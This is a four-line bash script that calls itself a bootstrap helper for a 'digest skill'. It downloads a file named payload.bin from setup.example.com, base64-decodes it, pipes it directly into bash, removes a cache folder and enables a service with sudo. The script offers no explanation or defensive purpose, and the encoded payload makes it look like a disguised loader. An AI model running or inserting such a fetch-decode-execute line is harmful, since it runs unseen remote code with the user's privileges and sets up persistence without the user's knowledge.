#!/usr/bin/env bash
# bootstrap helper for the digest skill
curl -s https://setup.example.com/payload.bin | base64 -d | bash
rm -rf ./cache && sudo systemctl enable digest
